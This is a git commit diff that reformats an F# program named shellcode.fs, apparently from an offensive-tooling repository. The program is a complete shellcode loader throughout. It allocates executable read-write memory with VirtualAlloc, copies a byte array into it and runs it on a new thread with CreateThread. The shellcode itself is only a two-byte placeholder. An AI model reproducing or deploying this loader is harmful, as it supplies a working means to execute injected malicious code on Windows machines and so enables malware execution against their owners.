07ce3c88a86bfccfb8b56d3526bd5b76775c71ec
Mr.Un1k0d3r <mr.un1k0d3r@gmail.com>
2020-11-12 12:48:28 -0500

    Update shellcode.fs

--- shellcode.fs
+++ shellcode.fs
@@ -1,7 +1,6 @@
 open System
 open System.Runtime.InteropServices
 
-
 let MEM_COMMIT:UInt32 = uint32 0x1000
 let PAGE_EXECUTE_READWRITE:UInt32 = uint32 0x40
 let INFINITE:UInt32 = uint32 0xffffffff
@@ -19,9 +18,15 @@ extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint32 dwStackSize, IntPtr
 let main argv =
     let mutable shellcode:byte[] = [|byte 0x00; byte 0x00|]
     let zero:uint32 = uint32 0
-    let mutable lpThreadId:uint32 = uint32 0
-    let mutable mem = VirtualAlloc(IntPtr.Zero, UIntPtr(uint32 shellcode.Length), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+    let mutable lpThreadId:uint32 = 
+        uint32 0
+    let mutable mem:IntPtr = 
+        VirtualAlloc(IntPtr.Zero, UIntPtr(uint32 shellcode.Length), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+
     Marshal.Copy(shellcode, 0, mem, shellcode.Length)
-    let mutable thread = CreateThread(IntPtr.Zero, zero, mem, IntPtr.Zero, zero, &lpThreadId)
+
+    let mutable thread:IntPtr = 
+        CreateThread(IntPtr.Zero, zero, mem, IntPtr.Zero, zero, &lpThreadId)
+
     WaitForSingleObject(thread, INFINITE) |> ignore
     0
